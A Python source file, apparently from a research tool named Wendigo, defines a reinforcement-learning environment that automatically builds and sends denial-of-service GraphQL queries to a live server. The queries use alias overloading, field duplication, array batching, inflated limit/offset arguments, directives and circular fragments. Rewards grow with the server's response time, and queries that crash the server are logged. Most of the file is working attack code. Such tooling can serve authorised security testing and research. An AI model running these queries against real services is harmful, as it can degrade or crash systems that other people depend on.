import operator
import pickle
from copy import deepcopy
from functools import reduce
from gymnasium import spaces
import numpy as np
import pandas as pd

from graphql import GraphQLScalarType, GraphQLObjectType, GraphQLList, GraphQLUnionType, GraphQLEnumType, GraphQLField, \
    GraphQLNonNull

from Wendigo.environments.GraphQLEnv import GraphQLEnv, ErrorType, connect

SEPERATOR = '_'
COMBINER = '-'
UNION = '|'

FIELDS = 'FIELDS'
ARGS = 'ARGS'

ADD = 'ADD'
REMOVE = 'REMOVE'

FRAGMENT = 'FRAGMENT'
DIRECTIVE = 'DIRECTIVE'
ALIAS = 'ALIAS'
DUPLICATION = 'DUPLICATION'
ARRAY_BATCH = 'ARRAY' + COMBINER + 'BATCHING'

QUERY_FIELD = 'QUERY' + COMBINER + 'FIELD'
HOLD = 'HOLD' + COMBINER + 'THE' + COMBINER + 'OBJECT'


def flatten_dict(d_dict):
    if d_dict == {}:
        return {}

    flattened = pd.json_normalize(d_dict, sep=SEPERATOR).columns.values.tolist()
    for v in list(d_dict.keys()):
        if v not in flattened:
            flattened.append(v)
    flattened.sort()

    return flattened


class GraphQLDoSEnv(GraphQLEnv):

    def __init__(self, schema, attack_settings, connection_settings=None, resume_data=(False, ()), step_save=None):
        super(GraphQLDoSEnv, self).__init__(connection_settings)

        self.step_save = step_save
        self.step_count = 0

        self._crash_memory = set() if not resume_data[0] else resume_data[1][1]

        self.greedy = attack_settings['greedy']

        # Query Size Bounds
        self.max_depth = attack_settings['max-depth']
        self.max_height = attack_settings['max-height']
        self.multiplier = attack_settings['multiplier']

        # Exploit Control
        self.exploit_circular_fragments = False
        self.exploit_aliases = True
        self.exploit_directives = False
        self.exploit_object_overloading = True
        self.exploit_regex = False
        self.exploit_batching = True

        self.exploit_args = self.exploit_object_overloading or self.exploit_regex

        # Object Limit Overloading
        if self.exploit_object_overloading:
            self.object_limit_multiplier = 100
            self.object_limit_wordlist = ['limit', 'offset', 'first', 'after', 'last', 'max', 'total', 'Limit',
                                          'Offset', 'First', 'After', 'Last', 'Max', 'Total']
        else:
            self.object_limit_multiplier = 0
            self.object_limit_wordlist = []

        # Regex Exploitation
        if self.exploit_regex:
            self.regex_payload = ''  # TODO add payload for regex
            self.regex_vuln_wordlist = ['search', 'key', 'keyword',
                                        'Search', 'Key', 'Keyword']
        else:
            self.regex_payload = ''
            self.regex_vuln_wordlist = []

        # Directive & Alias Exploitation
        self.directive_ordering = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',
                                   'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        self.directive_storage = []

        # Circular Fragment Exploitation
        self.fragment_counter = 0
        self.fragment_name = 'frag'

        # Other Controls
        self.allow_empty_objects = False

        # Query Space Data
        self.query_space = self._extract_schema(schema=schema)

        # Query Memory
        self._current_query = (np.zeros(shape=(len(self.query_space),), dtype=int) if not resume_data[0]
                               else resume_data[1][0])
        self._current_response_time = 0

        # Observations / Potential Query Space
        self.observation_space = spaces.Box(0, self.max_height, shape=(len(self.query_space),), dtype=int)

        # Actions Space & Action Space Mapping
        self.action_space = spaces.Discrete(len(self.query_space) * 2)

        self._action_to_change = [ADD + SEPERATOR + x for x in deepcopy(self.query_space)] + \
                                 [REMOVE + SEPERATOR + x for x in deepcopy(self.query_space)]

        # Reward Settings
        reward_settings = attack_settings['reward-settings']

        self._base_reward = reward_settings['base']
        self._repeat_reward = reward_settings['repeat']
        self._new_reward = reward_settings['new']

        self._rejected_reward = reward_settings['rejected']
        self._crash_reward = reward_settings['crash']

    def _extract_schema(self, schema):
        """
        Converts the schema into the query space
        :param schema: GraphQL schema object
        :return: dictionary of query space mapping and size of the query space
        """
        # Storage dictionary for query space
        query_space = {}

        for f_name, f_type in schema.query_type.fields.items():
            # Recursively expand the state space of each query (capped at max depth)
            results = self._process_field(f_type=f_type, depth=0, max_depth=self.max_depth)
            query_space[f_name] = results

        # Flatten query space
        base_query_space = pd.json_normalize(query_space, sep=SEPERATOR).columns.values.tolist()
        base_query_space = [x[:-(len(SEPERATOR) + len(HOLD))] if HOLD in x else x for x in base_query_space]
        base_query_space.sort()

        query_space = [x + COMBINER + DUPLICATION if ARGS not in x and FRAGMENT not in x else x for x in
                       base_query_space]

        # Add Aliasing
        if self.exploit_aliases:
            query_space = [x for x in query_space] + \
                          [x + COMBINER + ALIAS for x in base_query_space
                           if ARGS not in x and FRAGMENT not in x]

        # Add Directives
        if self.exploit_directives:
            query_space = [x for x in query_space] + \
                          [x + SEPERATOR + DIRECTIVE for x in query_space
                           if ARGS not in x and FRAGMENT not in x]

        # Sort query space
        query_space.sort()

        if self.exploit_batching:
            query_space = [ARRAY_BATCH, ] + query_space

        return query_space

    def _process_field(self, f_type, depth, max_depth, ):
        if isinstance(f_type, GraphQLField):
            # Handle Arguments
            f_args = {}
            if f_type.args is not {}:
                for a_name, a_type in f_type.args.items():
                    a_type_name = a_type.type.name

                    if a_name in self.object_limit_wordlist or a_name in self.regex_vuln_wordlist:
                        f_args[a_name] = a_type_name
                    elif isinstance(a_type, GraphQLNonNull):
                        f_args[a_name] = "!" + a_type_name

            # Handle Type
            f_fields = self._process_field(f_type=f_type.type, depth=depth, max_depth=max_depth)

            # Update Data
            if isinstance(f_fields, str) and len(f_args) == 0:
                if depth == 0:
                    f_type = QUERY_FIELD

                else:
                    f_type = f_fields

            elif isinstance(f_fields, str) and depth == 0:
                f_type = {FIELDS: {}, ARGS: f_args}

            elif isinstance(f_fields, GraphQLObjectType) or isinstance(f_fields, GraphQLUnionType):
                f_type = {FIELDS: f_fields, ARGS: f_args}

            elif FIELDS in f_fields and len(f_args) == 0:
                f_type = {FIELDS: f_fields[FIELDS], ARGS: f_fields[ARGS]}

            elif FIELDS in f_fields and len(f_fields[ARGS]) == 0:
                f_type = {FIELDS: f_fields[FIELDS], ARGS: f_args}

            else:
                f_type = {FIELDS: f_fields, ARGS: f_args}

            if isinstance(f_type, dict):
                if f_type[ARGS] == {}:
                    f_type = f_type[FIELDS]

                else:
                    f_type = f_type[FIELDS] | {ARGS: f_type[ARGS]}

        elif isinstance(f_type, GraphQLScalarType):
            f_type = f_type.name

        elif isinstance(f_type, GraphQLNonNull):
            f_type = self._process_field(f_type=f_type.of_type, depth=depth, max_depth=max_depth)

        elif isinstance(f_type, GraphQLObjectType):
            if depth > max_depth:
                return f_type

            else:
                fields = {}

                for k, v in f_type.fields.items():
                    if (depth + 1) > max_depth and (isinstance(v.type, GraphQLObjectType)
                                                    or isinstance(v.type, GraphQLList)
                                                    or isinstance(v.type, GraphQLUnionType)):
                        if self.allow_empty_objects:
                            fields[k] = v

                    else:
                        fields[k] = self._process_field(f_type=v, depth=depth + 1, max_depth=max_depth)

                fields[HOLD] = HOLD

                if self.exploit_circular_fragments:
                    fields[f_type.name + COMBINER + FRAGMENT] = FRAGMENT

                f_type = fields

        elif isinstance(f_type, GraphQLList):
            f_type = self._process_field(f_type=f_type.of_type, depth=depth, max_depth=max_depth)

        elif isinstance(f_type, GraphQLUnionType):
            temp_f_type = {}

            for t in f_type.types:
                t_type = self._process_field(f_type=t, depth=depth, max_depth=max_depth)
                t_type = {(t.name + UNION + k) if k is not HOLD else k: v for k, v in t_type.items()}
                temp_f_type.update(t_type)

            f_type = temp_f_type

        elif isinstance(f_type, GraphQLEnumType):
            print("Not Implemented")

        else:
            print("Not Implemented")

        return f_type

    def _get_obs(self):
        return self._current_query

    def _get_info(self):
        return {'resume_data': (self._current_query, self._crash_memory)}

    def _perform_action(self, action):

        query = deepcopy(self._current_query)
        query_action = self._action_to_change[int(action)]

        action_components = query_action.split(SEPERATOR)
        n_comp = len(action_components)

        if action_components[0] == ADD:
            trace = ""

            for i in range(1, n_comp):
                trace += action_components[i]

                if trace in self.query_space or any(x.startswith(trace + COMBINER) for x in self.query_space):
                    if trace in self.query_space:
                        query_i = self.query_space.index(trace)
                    elif trace + COMBINER + DUPLICATION in self.query_space:
                        query_i = self.query_space.index(trace + COMBINER + DUPLICATION)
                    elif trace + COMBINER + ALIAS in self.query_space:
                        query_i = self.query_space.index(trace + COMBINER + ALIAS)

                    if query[query_i] == 0 and i != n_comp - 1:
                        query[query_i] = 1

                    elif i == n_comp - 1:
                        if action_components[i] in self.regex_vuln_wordlist:
                            query[query_i] = 1  # Max value either 1 (included) or 0 (not included)

                        elif UNION in action_components[i]:
                            query[query_i] = 1

                        elif (query[query_i] + self.multiplier) >= self.max_height:
                            query[query_i] = self.max_height  # Already at max height can't increase more

                        else:
                            query[query_i] += self.multiplier

                trace += SEPERATOR

            # Add one field if an empty object was created
            qa = query_action[(len(ADD) + len(SEPERATOR)):]
            if ARRAY_BATCH not in qa:
                components = qa.split(COMBINER)
                children = [x for x in self.query_space if x.startswith(components[0] + SEPERATOR)]
            else:
                children = [x for x in self.query_space
                            ]
            c_sum = sum([query[self.query_space.index(x)] for x in children])
            if c_sum == 0 and len(children) > 0:
                scalar_children = [x for x in children if DIRECTIVE not in x and not any(sub.startswith(x + SEPERATOR)
                                                                                         for sub in self.query_space)]
                scalar_children.sort(key=len)
                query[self.query_space.index(scalar_children[0])] = self.multiplier

        elif action_components[0] == REMOVE:
            trace = query_action[(len(REMOVE) + len(SEPERATOR)):]
            query_i = self.query_space.index(trace)

            if query[query_i] > self.multiplier:
                query[query_i] -= self.multiplier

            elif query[query_i] <= self.multiplier:
                query[query_i] = 0

                components = trace.split(COMBINER)
                pair_sum = 0
                if self.exploit_aliases and ARGS not in trace and ARRAY_BATCH not in trace:
                    al_i = self.query_space.index(components[0] + COMBINER + ALIAS)
                    dup_i = self.query_space.index(components[0] + COMBINER + DUPLICATION)
                    pair_sum = query[al_i] + query[dup_i]

                if pair_sum == 0:
                    children = [x for x in self.query_space if x.startswith(components[0] + SEPERATOR)]
                    for c in children:
                        c_i = self.query_space.index(c)
                        query[c_i] = 0

                # Remove parent object if there are no longer children (removes the empty object)
                pc_sum = sum([query[self.query_space.index(x)]
                              for x in self.query_space if x.startswith(trace[:-len(action_components[-1])])])
                if pc_sum == 0 and ARGS not in trace:
                    parent_i = self.query_space.index(
                        trace[:-len(SEPERATOR + action_components[-1])] + COMBINER + DUPLICATION)
                    query[parent_i] = 0
                    if self.exploit_aliases:
                        parent_i = self.query_space.index(
                            trace[:-len(SEPERATOR + action_components[-1])] + COMBINER + ALIAS)
                        query[parent_i] = 0

        else:
            print("ACTION BESIDES ADD OR REMOVE NOT IMPLEMENTED")

        return query

    def _generate_directive(self):
        directive = ''
        carry = True

        for i in range(len(self.directive_storage)):
            if carry:
                val_i = self.directive_ordering.index(self.directive_storage[i]) + 1

                if val_i == len(self.directive_ordering):
                    self.directive_storage[i] = self.directive_ordering[0]

                else:
                    self.directive_storage[i] = self.directive_ordering[val_i]
                    carry = False

            directive += self.directive_storage[i]

        if carry:
            self.directive_storage.append(self.directive_ordering[0])
            directive += self.directive_ordering[0]

        return directive

    def _generate_fragment(self, obj, index, length):
        fragment = ' fragment ' + self.fragment_name + str(self.fragment_counter + index) + ' on ' + obj + '{\n'
        next_name = str(self.fragment_counter + index + 1) if index < length - 1 else str(self.fragment_counter)
        fragment += '   ... ' + self.fragment_name + next_name + '\n}'

        return fragment

    def queryify(self, query, indent=1):

        # Filter query space by index present in query to produce reduced name and quantity lists
        indexes = [x for x in range(0, len(query))]
        indexes = [i for i in indexes if query[i] > 0]

        components = [self.query_space[i] for i in indexes]
        quantity = [query[i] for i in indexes]

        query_info = {components[i]: quantity[i] for i in range(0, len(indexes))}

        # Separate aliases, directives, fragments, and arguments
        batching = 1
        aliases = {}
        duplications = {}
        aliases_directives = {}
        directives = {}
        fragments = {}
        args = {}

        remove = set()
        for i in range(0, len(components)):

            if ARRAY_BATCH in components[i]:
                batching = quantity[i] + 1
                remove.add(components[i])

            elif ALIAS in components[i] and DIRECTIVE in components[i]:
                a_d_comp = components[i][:-len(COMBINER + ALIAS + SEPERATOR + DIRECTIVE)]
                aliases_directives[a_d_comp] = quantity[i]
                remove.add(components[i])

            elif ALIAS in components[i]:
                alias_comp = components[i][:-len(COMBINER + ALIAS)]
                aliases[alias_comp] = quantity[i]

            elif DUPLICATION in components[i] and DIRECTIVE in components[i]:
                directives_comp = components[i][:-len(SEPERATOR + DIRECTIVE)]
                directives[directives_comp] = quantity[i]
                remove.add(components[i])

            elif DUPLICATION in components[i]:
                duplication_comp = components[i][:-len(COMBINER + DUPLICATION)]
                duplications[duplication_comp] = quantity[i]

            elif FRAGMENT in components[i]:
                fragments_comp = components[i][:-len(COMBINER + FRAGMENT)]
                fragments[fragments_comp] = quantity[i]
                # remove.add(components[i])

            elif ARGS in components[i]:
                args_comp = components[i].split(SEPERATOR + ARGS + SEPERATOR)
                args[args_comp[0]] = (args_comp[1], quantity[i])
                remove.add(components[i])

        for r in remove:
            query_info.pop(r)

        # Construct base dict w/out arguments
        base = {}

        core_info = [x.split(COMBINER)[0] for x in query_info.keys()]
        query_info = set()
        query_info.update(core_info)
        query_info = sorted(query_info)

        try:
            for component in query_info:
                sub_components = component.split(SEPERATOR)
                reduce(operator.getitem, sub_components[:-1], base)[sub_components[-1]] = {}

            for component in query_info:
                sub_components = component.split(SEPERATOR)
                values = reduce(operator.getitem, sub_components[:-1], base)[sub_components[-1]]

                if values == {}:
                    reduce(operator.getitem, sub_components[:-1], base)[sub_components[-1]] = None

        except KeyError:
            print("Error")

        self.fragment_counter = 0

        # Pass the base dict to recursive function to format
        exploits = {DUPLICATION: duplications, DIRECTIVE: directives, ALIAS: aliases,
                    ALIAS + DIRECTIVE: aliases_directives, FRAGMENT: fragments, ARGS: args}
        query_temp, fragments = self._queryify_recur(d=base, exploits=exploits)

        query_frag = ''
        for frag in fragments:
            query_frag += '\n' + frag + '\n'

        if batching > 1:
            query = [{'query': 'query {\n ' + query_temp + ' \n}' + query_frag} for i in range(0, batching)]

        else:
            query = {'query': 'query {\n ' + query_temp + ' \n}' + query_frag}

        return query

    def _queryify_recur(self, d, exploits, path="", indent=1):
        """
        Recursive function to convert sections of query space into a query string
        :param d: the base structure of the query in a dict
        :param exploits: a dictionary of exploit values
                         (duplications, directives, aliases, alias_directives, fragments, args)
        :param path: The current path in the query space
        :param indent: the current indent for formatting
        :return: this section of the query string
        """
        result = ''
        fragments = []
        for key, value in d.items():
            temp_path = path + SEPERATOR + key if indent > 1 else key

            if path != '' and path[-1] == UNION:  # Adjusting temp path if handling union
                temp_path = path + key

            # Argument Based Exploitation (Object Limit Overloading & Regex Exploitation)
            arg_val = self._handle_args(temp_path=temp_path, exploits=exploits)

            # Alias Overloading
            result_temp, frags = self._handle_repeat(exploit_name=ALIAS, key=key, value=value, arg_val=arg_val,
                                                     temp_path=temp_path, indent=indent, exploits=exploits)
            result += result_temp
            fragments += frags

            # Field Duplication Exploitation
            result_temp, frags = self._handle_repeat(exploit_name=DUPLICATION, key=key, value=value, arg_val=arg_val,
                                                     temp_path=temp_path, indent=indent, exploits=exploits)
            result += result_temp
            fragments += frags

            # Circular Fragment Exploitation
            result_temp, frags = self._handle_fragment(key=key, temp_path=temp_path, indent=indent, exploits=exploits)
            result += result_temp
            fragments += frags

        return result, fragments

    def _handle_repeat(self, exploit_name, key, value, arg_val, temp_path, indent, exploits):
        result = ''
        fragments = []

        exploit_in_path = temp_path in exploits[exploit_name]
        exploit_aliases = exploit_name == ALIAS and self.exploit_aliases
        exploit_duplications = exploit_name == DUPLICATION

        if exploit_in_path and (exploit_aliases or exploit_duplications):
            alias_counter = 0
            directives = ''
            aliasing_val = ''

            for i in range(0, exploits[exploit_name][temp_path]):
                if exploit_aliases:
                    aliasing_val = key + str(alias_counter) + ':'
                    alias_counter += 1
                    directives = exploits[ALIAS + DIRECTIVE]

                if exploit_duplications:
                    aliasing_val = ''
                    directives = exploits[DIRECTIVE]

                directive_val = self._handle_directive(temp_path=temp_path, directives=directives)

                result += ('  ' * indent) + aliasing_val + key + arg_val + directive_val

                if isinstance(value, dict) and len(value) > 0:  # Nested dictionary
                    if any(UNION in x for x in value):
                        query, frags = self._handle_union(value=value, temp_path=temp_path, indent=indent,
                                                          exploits=exploits)
                        result += query
                        fragments += frags

                    else:
                        nested_query, frags = self._queryify_recur(d=value, exploits=exploits, path=temp_path,
                                                                   indent=indent + 1)
                        result += ' {\n' + nested_query + '\n' + ('  ' * indent) + '}'
                        fragments += frags

                result += '\n'

        return result, fragments

    def _handle_directive(self, temp_path, directives):
        directive_val = ''

        if temp_path in directives and self.exploit_directives:  # Directive Exploitation
            generated_directives = [self._generate_directive() for i in range(directives[temp_path])]
            for d in generated_directives:
                directive_val += '@' + d

        return directive_val

    def _handle_union(self, value, temp_path, indent, exploits):
        objects = [x.split(UNION)[0] for x in value.keys()]
        unique_objects = set()
        unique_objects.update(objects)
        unique_objects = sorted(unique_objects)

        result = ' {'
        fragments = []

        for uo in unique_objects:
            temp_value = {k.split(UNION)[1]: v for k, v in value.items() if uo in k}
            result += '\n' + ('  ' * (indent + 1)) + '... on ' + uo

            nested_query, fragments_temp = self._queryify_recur(d=temp_value, exploits=exploits,
                                                                path=temp_path + SEPERATOR + uo + UNION,
                                                                indent=indent + 2)

            result += ' {\n' + nested_query + '\n' + ('  ' * (indent + 1)) + '}'
            fragments += fragments_temp

        result += '\n}'

        return result, fragments

    def _handle_fragment(self, key, temp_path, indent, exploits):
        result = ''
        fragments = []

        if temp_path in exploits[FRAGMENT] and self.exploit_circular_fragments:
            result += ('  ' * (indent + 1)) + '... ' + self.fragment_name + str(self.fragment_counter)

            num_frags = exploits[FRAGMENT][temp_path] + 1
            fragments = [self._generate_fragment(obj=key, index=i, length=num_frags) for i in range(0, num_frags)]
            self.fragment_counter += num_frags

        return result, fragments

    def _handle_args(self, temp_path, exploits):
        # Argument-Based Exploitation Setup
        relevant_args = [v for k, v in exploits[ARGS].items() if k == temp_path]
        arg_val = ''

        if relevant_args and self.exploit_args:
            arg_val = '('

            for k, v in relevant_args:
                if k in self.object_limit_wordlist:  # Object Limit Overloading
                    arg_val += k + ':' + str(v * self.object_limit_multiplier) + ', '

                elif k in self.regex_vuln_wordlist:  # Regex Exploitation
                    arg_val += k + ':' + self.regex_payload + ', '

            arg_val = arg_val[:-2] + ')'

        return arg_val

    def _reward_func(self, response_time, is_rejected, is_server_unresponsive):
        reward = 0

        reward = response_time

        return reward

    def reset(self, seed=None, options=None):
        # self._current_query = (np.zeros(shape=(len(self.query_space),), dtype=int)
        #                        if self._current_query is None else self._current_query)

        self._current_query = np.zeros(shape=(len(self.query_space),), dtype=int)
        return super().reset(seed=seed, options=options)

    def step(self, action):

        self.step_count += 1
        response_time = 0
        reward = 0
        is_rejected = False

        # reward = self._base_reward
        terminated = False
        truncated = False

        # Perform Action
        base_query = self._perform_action(action=action)

        # Check query memory to see if it is an already visited terminal state
        if tuple(base_query.tolist()) in self._crash_memory or np.array_equal(base_query, self._current_query):
            # reward += self._repeat_reward
            reward = response_time

        else:
            if not self.greedy:
                # Update current query
                self._current_query = base_query

            is_rejected = False
            query = self.queryify(base_query)
            response, response_time, error = self.send_query(query=query)

            # Determine if the episode is terminated (i.e. server crashed)
            if error == ErrorType.ConnectionError:
                _, _, error = self.send_query(query="")

                if error == ErrorType.ConnectionError:
                    terminated = True
                    response_time = None

                    # Add new crash query to memory
                    self._crash_memory.add(tuple(base_query.tolist()))

            # Determine if the episode is truncated (i.e. connection dies or times out)
            elif error == ErrorType.HostError or (error == ErrorType.BrokenPipe and response is None):
                truncated = True

            # Determine if the response was rejected
            elif (response is not None and '"errors":' in response.decode('utf-8') and
                  'HTTP/1.1 400 BAD REQUEST\r\nContent-Type' in response.decode('utf-8')):
                is_rejected = True

            if (not truncated and not terminated) or response == b'':
                self._connection, connected = connect(self._connection_settings)

                if not connected:
                    terminated = True
                    truncated = False
                    self._crash_memory.add(tuple(base_query.tolist()))  # Add new crash query to memory

            print('')
            print('*' * 100)
            print('')
            print('Response Time: ' + str(response_time) + ', Rejected: ' + str(is_rejected)
                  + ', Terminated: ' + str(terminated) + ', Truncated: ' + str(truncated))

            print('')
            print('*' * 100)
            print('')

            if not truncated:
                if not is_rejected:
                    if self.greedy and response_time > self._current_response_time:
                        self._current_query = base_query
                        self._current_response_time = response_time

                # reward += self._new_reward
                reward += self._reward_func(response_time=response_time, is_rejected=is_rejected,
                                            is_server_unresponsive=terminated)

        if self.step_save:
            with (open('results/steps/' + self.step_save + '/' + self.step_save + '-' + str(self.step_count) + '.p',
                       "wb") as file):
                pickle.dump((self.step_count, base_query, response_time, is_rejected, truncated, terminated, reward),
                            file)

        # Convert observation and info
        observation = self._get_obs()
        info = self._get_info()

        return observation, reward, terminated, truncated, info
